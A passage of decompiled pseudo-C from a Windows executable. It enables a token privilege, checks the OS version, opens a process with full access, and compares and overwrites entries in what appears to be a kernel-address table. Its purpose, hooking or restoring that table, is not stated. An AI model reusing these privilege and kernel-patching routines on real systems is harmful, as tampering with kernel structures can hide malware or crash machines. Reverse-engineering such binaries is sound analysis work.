	OpenProcessToken(GetCurrentProcess(), 0x28, fp - 0x08);
	LookupPrivilegeValueA(0x00, 0x13141280, fp - 0x10);
	AdjustTokenPrivileges(dwLoc08, 0x00, fp - 0x20, 0x10, null, null);
	CloseHandle(dwLoc08);
	return;
}

// 13141E2C: Register uint32 fn13141E2C(Register uint32 edx, Register word32 ebx, Register ptr32 ebp, Register word32 esi, Register word32 edi, Register (ptr Eq_6) es, Register (ptr Eq_7) ds, Register out ptr32 ebxOut)
uint32 fn13141E2C(uint32 edx, word32 ebx, ptr32 ebp, word32 esi, word32 edi, Eq_6 * es, Eq_7 * ds, ptr32 & ebxOut)
{
	*ebxOut = ebx;
	Eq_9 eax_109;
	Eq_9 eax_15 = GetVersionExA(fp - 0x9C);
	if (dwLoc98 != 0x05)
	{
l13141E58:
		eax_109 = DPB(eax_15, 0x01, 0);
		goto l13142080;
	}
	eax_15 = dwLoc94;
	if (dwLoc94 != 0x00 && dwLoc94 != 0x01)
		goto l13141E58;
	globals->t13144028 = dwLoc94;
	eax_15 = fn131418AE();
	if (eax_15 == 0x00)
		goto l13141E58;
	esi = fn13141A19(edx, ebx, fp - 0x7C, es, ds, out edi);
	if (fn1314195D() == ~0x00)
	{
		eax_15 = fn1314195D();
		if (eax_15 == ~0x00)
			goto l13141E58;
	}
	word32 eax_89;
	fn131415DD(fp - 0x7C, es, ds, 320082620, out eax_89, out edx);
	*(fp - 244) = eax_89;
	if (eax_89 == 0x00)
	{
		eax_109 = (Eq_9) DPB(eax_89, 0x01, 0);
		goto l1314207F;
	}
	*(fp - 0x01FC) = esi;
	*(fp - 0x0200) = 0x131412A0;
	*(fp - 0x0204) = eax_89;
	word32 eax_125 = fn1314177C(dwArg00, dwArg04, out edx);
	*(fp - 252) = eax_125;
	if (eax_125 == 0x00)
	{
l13141EEE:
		eax_109 = (Eq_9) DPB(eax_125, 0x01, 0);
		goto l1314207E;
	}
	*(fp - 0x0200) = fp - 0xF8;
	*(fp - 0x0204) = fp - 500;
	*(fp - 0x0208) = fp - 0x0114;
	*(fp - 0x020C) = fp - 220;
	*(fp - 0x0210) = eax_89;
	eax_125 = fn13141492(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, out edx);
	if ((byte) eax_125 == 0x00)
		goto l13141EEE;
	*(fp - 0x0200) = ebx;
	word32 eax_184 = fn13141B39();
	*(fp - 0xE0) = *(fp - 0xE0) & 0x00;
	word32 ecx_190 = eax_184 - 0x80000000 - *(fp - 0x01D8);
	*(fp - 0xEC) = eax_184 - 0x80000000 + eax_125;
	*(fp - 0x0204) = fp - 0xE0;
	*(fp - 0x0208) = fp - 228;
	*(fp - 0x020C) = fp - 0xEC;
	*(fp - 0x0210) = *(fp - 232);
	*(fp - 0xF8) = ecx_190;
	*(fp - 228) = 0x2000;
	word32 esi_211;
	word32 edi_212;
	BOOL eax_213 = fn131419C3(dwArg00, dwArg04, dwArg08, dwArg0C, out edx, out esi_211, out edi_212);
	if (eax_213 == 0x00)
	{
l1314207B:
		eax_109 = DPB(eax_213, 0x00, 0);
		goto l1314207D;
	}
	else
	{
		word32 esi_248 = esi_211 - *(fp - 0xEC);
		uint32 eax_250 = *(fp - 228) - esi_248;
		if (eax_250 >= 0x04)
		{
			edx = *(fp - 0xE0);
			struct Eq_2309 * ecx_271 = esi_248 + edx;
			word32 esi_272 = ecx_271->dw0000;
			if (eax_250 >= 0x0C)
			{
				eax_250 = ecx_271->dw0008;
				*(fp - 0xF0) = eax_250;
			}
			*(fp - 0x0204) = edx;
			fn13141A0C(dwArg00);
			if (*(fp - 0xF0) < 300)
			{
				*(fp - 0xE0) = *(fp - 0xE0) & 0x00;
				*(fp - 0x0204) = fp - 0xE0;
				*(fp - 0x0208) = fp - 228;
				*(fp - 0x020C) = fp - 0xEC;
				*(fp - 0x0210) = *(fp - 232);
				*(fp - 0xEC) = esi_272 + 0x80000000;
				*(fp - 228) = 0x2000;
				word32 esi_300;
				word32 edi_301;
				eax_213 = fn131419C3(dwArg00, dwArg04, dwArg08, dwArg0C, out edx, out esi_300, out edi_301);
				if (eax_213 == 0x00)
					goto l1314207B;
				word32 esi_310 = edi_301 - *(fp - 0xEC);
				uint32 eax_311 = *(fp - 228) - esi_310;
				uint32 ebx_308 = *(fp - 0xF0);
				eax_213 = eax_311 >> 0x02;
				if (eax_311 >> 0x02 >= ebx_308)
				{
					*(fp - 0x0204) = ebx_308 << 0x02;
					eax_250 = fn13141CFF(dwArg00);
					*(fp - 232) = eax_250;
					if (eax_250 != 0x00)
					{
						*(fp - 0x0204) = 320082580;
						fn131415DD(fp - 0x7C, es, ds, dwArg00, out eax_250, out edx);
						if (eax_250 != 0x00)
						{
							*(fp - 0x0204) = ebx_308;
							*(fp - 0x0208) = *(fp - 232);
							*(fp - 0x020C) = eax_250;
							word32 edi_344;
							Eq_1865 ecx_345 = fn131417F3(dwArg00, dwArg04, dwArg08, out edi_344);
							Eq_9 ebx_347 = esi_310 + *(fp - 0xE0);
							*(fp - 0x0210) = fp - 500;
							*(fp - 0x0214) = *(fp - 252);
							*(fp - 0x0218) = *(fp - 244);
							eax_213 = fn13141C57(ecx_345, dwArg00, dwArg04, dwArg08, out edx);
							word32 esi_361 = (word32) eax_213 + *(fp - 244);
							if (esi_361 != 0x00 && ((edi_344 - *(fp - 0x01D8)) - *(fp - 0xF8)) + *(fp - 244) != esi_361)
							{
								*(fp - 0x0204) = 0x04;
								*(fp - 0x0208) = esi_361;
								eax_213 = IsBadReadPtr(*(fp - 0x0208), *(fp - 0x0204));
								if (eax_213 == 0x00)
								{
									ui32 eax_396 = *(fp - 0xF0);
									*(fp - 0x0204) = 0x04;
									*(fp - 0x0208) = (eax_396 << 0x02) - 0x04 + esi_361;
									eax_213 = IsBadReadPtr(*(fp - 0x0208), *(fp - 0x0204));
									if (eax_213 == 0x00)
									{
										word32 edi_408 = *(fp - 0xF0);
										if (true)
										{
											eax_213 = ebx_347;
											int32 esi_414 = esi_361 - ebx_347;
											do
											{
												edx = *(fp - 0xF8);
												word32 ecx_422 = *((word32) eax_213 + esi_414);
												if (*eax_213 - edx - 0x80000000 != ecx_422)
													*eax_213 = (Eq_9) (ecx_422 + 0x80000000 + edx);
												eax_213 = eax_213 + 0x04;
												edi_408 = edi_408 - 0x01;
											} while (edi_408 != 0x00);
										}
									}
								}
							}
							*(fp - 0x0204) = *(fp - 0xE0);
							fn13141A0C(dwArg00);
							goto l1314207B;
						}
					}
					goto l1314208F;
				}
				goto l1314207B;
			}
		}
l1314208F:
		eax_109 = (Eq_9) DPB(eax_250, 0x01, 0);
l1314207D:
		*ebxOut = *(fp - 0x0200);
l1314207E:
		esi = *(fp - 0x01FC);
l1314207F:
		edi = *(fp - 0x01F8);
l13142080:
		fn131420E0(eax_109, *(fp - 0x08) ^ fp - 0x7C, edx, ebx, fp - 0x7C, esi, edi, es, ds, ebp);
		return edx;
	}
}

// 13142093: Register Eq_161 Win32CrtStartup()
Eq_161 Win32CrtStartup()
{
	fn13141DC8();
	word32 ebx_9;
	word32 edx_10 = fn13141E2C(edx, ebx, ebp, esi, edi, es, ds, out ebx_9);
	*(fp - 0x04) = 0x13141D19;
	*(fp - 0x08) = 320082636;
	word32 eax_16 = fn13141340(edx_10, ebx_9, ebp, es, ds, dwArg00);
	Eq_161 ecx_17 = *(fp - 0x08);
	*(fp - 0x08) = eax_16;
	*(fp - 0x0C) = 0x00;
	*(fp - 0x10) = 0x001F0FFF;
	*(fp - 0x08) = (union Eq_53 *) OpenProcess(*(fp - 0x10), *(fp - 0x0C), *(fp - 0x08));
	fn131413D7(ecx_17, dwArg00, dwArg04);
	return 0x00;
}

// 131420E0: Register Eq_9 fn131420E0(Register Eq_9 eax, Register ui32 ecx, Register uint32 edx, Register word32 ebx, Register (ptr Eq_30) ebp, Register word32 esi, Register word32 edi, Register (ptr Eq_6) es, Register (ptr Eq_7) ds, Stack ptr32 dwArg00)
BOOL fn131420E0(BOOL eax, ui32 ecx, uint32 edx, word32 ebx, Eq_30 * ebp, word32 esi, word32 edi, Eq_6 * es, Eq_7 * ds, ptr32 dwArg00)
{
	if (ecx != globals->dw13144000)
	{
		globals->t13144150 = eax;
		globals->dw1314414C = ecx;
		globals->dw13144148 = edx;
		globals->dw13144144 = ebx;
		globals->dw13144140 = esi;
		globals->dw1314413C = edi;
		globals->ptr13144168 = ss;
		globals->ptr1314415C = cs;
		globals->ptr13144138 = ds;
		globals->ptr13144134 = es;
		globals->ptr13144130 = fs;
		globals->ptr1314412C = gs;
		globals->t13144160 = cond(fp - 0x032C);
		globals->ptr13144154 = ebp;
		globals->dw13144158 = dwArg00;
		globals->ptr13144164 = fp + 0x04;
		globals->dw131440A0 = 0x00010001;
		globals->dw13144054 = globals->dw13144158;
		globals->dw13144048 = 0xC0000409;
		globals->dw1314404C = 0x01;
		globals->t13144098 = IsDebuggerPresent();
		fn1314276D();
		SetUnhandledExceptionFilter(null);
		UnhandledExceptionFilter(&globals->t131412D8);
		if (globals->t13144098 == 0x00)
			fn1314276D();
		return TerminateProcess(GetCurrentProcess(), 0xC0000409);
	}
	else
		return eax;
}

// 131420F0: FlagGroup bool fn131420F0(Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Register out (ptr Eq_500) ebpOut, Register out ptr32 esiOut, Register out (ptr Eq_502) ediOut)
bool fn131420F0(word32 dwArg04, word32 dwArg08, word32 dwArg0C, Eq_500 * & ebpOut, ptr32 & esiOut, Eq_502 * & ediOut)
{
	word32 eax_20 = dwArg0C + dwArg08;
	if (dwArg04 <= dwArg08 || dwArg04 >= eax_20)
	{
		if (dwArg0C < (word32 *) 0x0100 || (globals->dw13144378 == 0x00 || (dwArg04 & 0x0F) != (dwArg08 & 0x0F)))
		{
			word32 * esi_51 = dwArg08;
			word32 * edi_52 = dwArg04;
			if ((dwArg04 & 0x03) != 0x00)
			{
				if (dwArg0C < (word32 *) 0x04)
				{
					word32 esp_104;
					word32 ebp_105;
					word32 edi_106;
					word32 esi_107;
					word32 ecx_108;
					word32 eax_109;
					word32 edx_110;
					byte SCZO_111;
					byte CZ_112;
					byte C_113;
					byte Z_114;
					byte SZO_115;
					word32 ebx_116;
					bool D_117;
					(*((char *) globals->a13142274 + (dwArg0C - 0x04) * 0x04))();
					return D_117;
				}
				else
				{
					word32 esp_90;
					word32 ebp_91;
					word32 edi_92;
					word32 esi_93;
					word32 ecx_94;
					word32 eax_95;
					word32 edx_96;
					byte SCZO_97;
					byte CZ_98;
					byte C_99;
					byte Z_100;
					byte SZO_101;
					word32 ebx_102;
					bool D_103;
					(*((char *) globals->a13142178 + (dwArg04 & 0x03) * 0x04))();
					return D_103;
				}
			}
			else
			{
				uint32 ecx_57 = dwArg0C >> 0x02;
				if (dwArg0C >> 0x02 < 0x08)
				{
					switch (dwArg0C & 0x03)
						;
				}
				else
				{
					while (ecx_57 != 0x00)
					{
						*edi_52 = *esi_51;
						esi_51 = esi_51 + 0x01;
						edi_52 = edi_52 + 0x01;
						ecx_57 = ecx_57 - 0x01;
					}
					switch (dwArg0C & 0x03)
					{
					case 0x00:
						word32 esi_64;
						*esiOut = esi;
						word32 edi_66;
						*ediOut = edi;
						word32 ebp_68;
						*ebpOut = ebp;
						return D;
					}
				}
			}
		}
		else
		{
			word32 esi_132;
			*esiOut = esi;
			word32 edi_134;
			*ediOut = edi;
			word32 ebp_136;
			*ebpOut = ebp;
			fn13142676(dwArg04, dwArg08, dwArg0C);
			return D;
		}
	}
	else
	{
		word32 * esi_141 = dwArg08 + (dwArg0C - 0x04);
		word32 * edi_142 = dwArg04 + (dwArg0C - 0x04);
		if ((edi_142 & 0x03) != 0x00)
		{
			if (dwArg0C < (word32 *) 0x04)
			{
				switch (dwArg0C)
					;
			}
			else
			{
				word32 esp_199;
				word32 ebp_200;
				word32 edi_201;
				word32 esi_202;
				word32 ecx_203;
				word32 eax_204;
				word32 edx_205;
				byte SCZO_206;
				byte CZ_207;
				byte C_208;
				byte Z_209;
				byte SZO_210;
				word32 ebx_211;
				bool D_212;
				(*((char *) globals->a13142304 + (edi_142 & 0x03) * 0x04))();
				return D_212;
			}
		}
		else
		{
			uint32 ecx_159 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				uint32 ecx_174 = -(dwArg0C >> 0x02);
				word32 esp_177;
				word32 ebp_178;
				word32 edi_179;
				word32 esi_180;
				word32 ecx_181;
				word32 eax_182;
				word32 edx_183;
				byte SCZO_184;
				byte CZ_185;
				byte C_186;
				byte Z_187;
				byte SZO_188;
				word32 ebx_189;
				bool D_190;
				(*((char *) globals->a131423B0 + ecx_174 * 0x04))();
				return D_190;
			}
			else
			{
				while (ecx_159 != 0x00)
				{
					*edi_142 = *esi_141;
					esi_141 = esi_141 - 0x04;
					edi_142 = edi_142 - 0x04;
					ecx_159 = ecx_159 - 0x01;
				}
				D = false;
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_153;
					*esiOut = esi;
					word32 edi_155;
					*ediOut = edi;
					word32 ebp_157;
					*ebpOut = ebp;
					return D;
				}
			}
		}
	}
}

// 131425EF: void fn131425EF(Stack (ptr word32) dwArg04, Stack (ptr word32) dwArg08, Stack (ptr word32) dwArg0C)
void fn131425EF(word32 * dwArg04, word32 * dwArg08, word32 * dwArg0C)
{
	struct Eq_3044 * esi_12 = dwArg08;
	struct Eq_3046 * edi_14 = dwArg04;
	uint32 ecx_17 = dwArg0C >> 0x07;
	do
	{
		word128 xmm1_24 = esi_12->ow0010;
		word128 xmm2_25 = esi_12->ow0020;
		word128 xmm3_26 = esi_12->ow0030;
		edi_14->ow0000 = esi_12->ow0000;
		edi_14->ow0010 = xmm1_24;
		edi_14->ow0020 = xmm2_25;
		edi_14->ow0030 = xmm3_26;
		word128 xmm5_32 = esi_12->ow0050;
		word128 xmm6_33 = esi_12->ow0060;
		word128 xmm7_34 = esi_12->ow0070;
		edi_14->ow0040 = esi_12->ow0040;
		edi_14->ow0050 = xmm5_32;
		edi_14->ow0060 = xmm6_33;
		edi_14->ow0070 = xmm7_34;
		esi_12 = esi_12 + 0x01;
		edi_14 = edi_14 + 0x01;
		ecx_17 = ecx_17 - 0x01;
	} while (ecx_17 != 0x00);
	return;
}

// 13142676: void fn13142676(Stack (ptr word32) dwArg04, Stack (ptr word32) dwArg08, Stack (ptr word32) dwArg0C)
void fn13142676(word32 * dwArg04, word32 * dwArg08, word32 * dwArg0C)
{
	esp = fp;
	esp = fp - 0x04;
	dwLoc04 = ebp;
	ebp = fp - 0x04;
	esp = fp - 0x20;
	dwLoc10 = edi;
	dwLoc0C = esi;
	dwLoc08 = ebx;
	ebx = dwArg08;
	eax = ebx;
	edx_eax = (int64) eax;
	eax = (word32) edx_eax;
	edx = SLICE(edx_eax, word32, 32);
	ecx = eax;
	eax = dwArg04;
	ecx = ecx ^ edx;
	ecx = ecx - edx;
	ecx = ecx & 0x0F;
	ecx = ecx ^ edx;
	ecx = ecx - edx;
	edx_eax = (int64) eax;
	eax = (word32) edx_eax;
	edx = SLICE(edx_eax, word32, 32);
	edi = eax;
	edi = edi ^ edx;
	edi = edi - edx;
	edi = edi & 0x0F;
	edi = edi ^ edx;
	edi = edi - edx;
	edx = ecx;
	edx = edx | edi;
	edx_eax = (int64) &(edx->*eax);
	SZO = cond(edx);
	Z = SZO;
	C = false;
	if (Test(EQ,Z))
	{
		esi = dwArg0C;
		ecx = esi;
		ecx = ecx & 0x7F;
		dwLoc1C = ecx;
		SCZO = cond(esi - ecx);
		Z = SCZO;
		if (Test(NE,Z))
		{
			esi = esi - ecx;
			SCZO = cond(esi);
			esp = fp - 0x24;
			dwLoc24 = esi;
			esp = fp - 0x28;
			dwLoc28 = ebx;
			esp = fp - 44;
			dwLoc2C = eax;
			fn131425EF(dwLoc2C, dwLoc28, dwLoc24);
			esp = fp - 0x20;
			SCZO = cond(fp - 0x20);
			eax = dwArg04;
			edx_eax = (int64) &(edx->*eax);
			ecx = dwLoc1C;
		}
		SZO = cond(ecx & ecx);
		Z = SZO;
		C = false;
		if (Test(NE,Z))
		{
			ebx = dwArg0C;
			edx = dwArg08;
			edx = edx + ebx;
			edx = edx - ecx;
			dwLoc18 = edx;
			ebx = ebx + eax;
			ebx = ebx - ecx;
			SCZO = cond(ebx);
			dwLoc14 = ebx;
			esi = dwLoc18;
			edi = dwLoc14;
			ecx = dwLoc1C;
			while (ecx != null)
			{
				v15.u1 = *esi;
				*edi = (word32) v15;
				esi = (word32 *) ((char *) esi + 0x01);
				edi = (word32 *) ((char *) edi + 0x01);
				ecx = ecx - 0x01;
			}
			eax = dwArg04;
		}
	}
	else
	{
		SCZO = cond(ecx - edi);
		Z = SCZO;
		if (Test(EQ,Z))
		{
			ecx = -ecx;
			ecx = ecx + 0x04;
			SCZO = cond(ecx);
			dwLoc20 = ecx;
			esi = dwArg08;
			edi = dwArg04;
			ecx = dwLoc20;
			while (ecx != null)
			{
				v16.u1 = *esi;
				*edi = (word32) v16;
				esi = (word32 *) ((char *) esi + 0x01);
				edi = (word32 *) ((char *) edi + 0x01);
				ecx = ecx - 0x01;
			}
			ecx = dwArg04;
			ecx = ecx + dwLoc20;
			edx = dwArg08;
			edx = edx + dwLoc20;
			eax = dwArg0C;
			eax = eax - dwLoc20;
			SCZO = cond(eax);
			esp = fp - 0x24;
			dwLoc24 = eax;
			esp = fp - 0x28;
			dwLoc28 = edx;
			esp = fp - 44;
			dwLoc2C = ecx;
			fn13142676(dwLoc2C, dwLoc28, dwLoc24);
			esp = fp - 0x28;
			esp = fp - 0x1C;
			SCZO = cond(fp - 0x1C);
			eax = dwArg04;
		}
		else
		{
			esi = dwArg08;
			edi = dwArg04;
			ecx = dwArg0C;
			edx = ecx;
			ecx = ecx >> 0x02;
			SCZO = cond(ecx);
			while (ecx != null)
			{
				v17.u1 = *esi;
				*edi = (word32) v17;
				esi = esi + 0x01;
				edi = edi + 0x01;
				ecx = ecx - 0x01;
			}
			ecx = edx;
			ecx = ecx & 0x03;
			SZO = cond(ecx);
			C = false;
			while (ecx != null)
			{
				v18.u1 = *esi;
				*edi = (word32) v18;
				esi = (word32 *) ((char *) esi + 0x01);
				edi = (word32 *) ((char *) edi + 0x01);
				ecx = ecx - 0x01;
			}
			eax = dwArg04;
		}
	}
	ebx = dwLoc08;
	esi = dwLoc0C;
	edi = dwLoc10;
	esp = fp - 0x04;
	ebp = dwLoc04;
	esp = fp;
	return;
}

// 1314276D: void fn1314276D()
void fn1314276D()
{
	globals->dw13144370 = globals->dw13144370 & 0x00;
	return;
}

